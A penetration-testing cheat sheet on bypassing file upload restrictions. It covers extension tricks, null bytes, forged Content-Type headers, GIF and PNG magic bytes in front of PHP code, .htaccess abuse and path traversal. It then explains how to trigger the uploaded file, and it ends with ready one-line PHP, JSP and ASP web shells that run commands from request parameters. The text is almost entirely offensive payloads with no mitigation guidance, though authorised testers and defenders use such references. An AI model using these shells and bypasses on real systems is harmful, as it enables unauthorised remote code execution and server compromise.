# File Upload Bypass Techniques

## Detection
- Look for upload forms, drag-and-drop areas, API endpoints accepting multipart
- Check allowed file types in client-side validation (easily bypassed)
- Test with common extensions: .php, .jsp, .aspx, .py, .sh

## Bypass Techniques

### Extension Bypass
- Double extensions: `shell.php.jpg`, `shell.jpg.php`
- Null byte: `shell.php%00.jpg` (older servers)
- Case variation: `shell.PhP`, `shell.JsP`
- Alternative extensions: `.phtml`, `.php5`, `.pht`, `.php3`
- htaccess: upload `.htaccess` to make server interpret other files as PHP

### Content-Type Bypass
- Change `Content-Type` header from `application/x-php` to `image/jpeg`
- Server may only check MIME type, not actual content

### Magic Bytes
- Prepend valid image headers to PHP code
- GIF: `GIF89a;<?php system($_GET['cmd']); ?>`
- PNG: `\x89PNG\r\n\x1a\n` + PHP code (may need valid IHDR)
- JPEG: `\xFF\xD8\xFF\xE0` + PHP code

### Filename Bypass
- Special characters: `shell.p.hp`, `shell php.jpg`
- Path traversal in filename: `../../../etc/passwd`
- Overlong UTF-8 encoding of dots

### Server-Side Bypass
- Upload to different directory if possible
- Race condition: access file before server validates/deletes
- Polyglot files: valid image + valid script

## After Upload
- Locate uploaded file path (often predictable)
- Access with query parameters: `shell.php?cmd=id`
- If direct execution fails, try LFI to include uploaded file
- Check for WAF or antivirus blocking

## Common Shells
- PHP: `<?php system($_GET['cmd']); ?>`
- JSP: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
- ASP: `<% execute(request("cmd")) %>`
